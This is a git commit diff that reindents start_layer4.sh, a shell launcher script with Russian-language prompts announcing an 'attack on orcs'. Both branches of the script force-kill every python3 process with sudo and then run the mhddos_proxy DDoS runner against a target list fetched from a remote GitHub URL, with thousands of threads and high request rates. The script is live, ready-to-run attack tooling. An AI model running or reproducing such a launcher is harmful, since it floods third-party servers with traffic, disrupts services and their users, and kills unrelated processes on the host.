4007a0ffcc94de631548e5ed7c68fed1595db5dc
sania-owner <saniaowner@ya.ru>
2022-04-03 02:09:49 +0300

    Update start_layer4.sh

--- start_layer4.sh
+++ start_layer4.sh
@@ -4,10 +4,10 @@ read item
 case "$item" in
     1|2|3|4|5|6|7|8|9|10|12|13|14|15|16) echo "Вы указали $item ядро(ядер). Начинаем атаку на орков"
         sudo pkill -9 -f "python3"
-		cd /root/mhddos_proxy; python3 runner.py -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4.lst -t $item"000" -p 350 --rpc 2000 --debug
+	cd /root/mhddos_proxy; python3 runner.py -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4.lst -t $item"000" -p 350 --rpc 2000 --debug
         ;;
     *) echo "По умолчанию выбрано одно ядро. Начинаем атаку на орков"
-		sudo pkill -9 -f "python3"
-		cd /root/mhddos_proxy; python3 runner.py -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4.lst -t 1000 -p 350 --rpc 2000 --debug
-		;;
+	sudo pkill -9 -f "python3"
+	cd /root/mhddos_proxy; python3 runner.py -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4.lst -t 1000 -p 350 --rpc 2000 --debug
+	;;
 esac
